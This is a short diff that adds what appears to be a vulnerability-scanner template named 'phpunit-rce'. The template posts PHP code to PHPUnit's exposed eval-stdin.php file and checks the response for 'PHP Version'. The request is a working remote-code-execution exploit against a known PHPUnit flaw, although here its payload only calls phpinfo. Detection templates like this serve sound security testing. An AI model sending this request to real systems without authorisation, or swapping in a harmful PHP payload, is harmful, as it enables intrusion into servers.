@@ -1,0 +1,11 @@
+name: phpunit-rce
+request:
+  raw: |
+    POST {{BaseURL}}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+
+    <?php phpinfo();?>
+
+matcher:
+  type: word
+  words: ["PHP Version"]
